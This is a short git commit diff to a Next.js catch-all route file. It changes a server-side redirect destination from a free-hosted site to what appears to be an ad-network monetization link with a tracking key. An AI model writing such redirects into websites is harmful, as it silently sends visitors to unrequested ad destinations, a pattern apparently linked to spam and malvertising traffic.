a2ab57bb476fdac69366e85d956eed054725ea4a
UsaTime <160224255+Yanur888@users.noreply.github.com>
2024-02-17 02:37:02 -1000

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					'https://usalivetv.000webhostapp.com/'
+					'https://www.profitablegatecpm.com/ydwgk6rg?key=3afd21cc79f1bfae0a7d7f24376bdafc/'
 				}`,
 			},
 		};
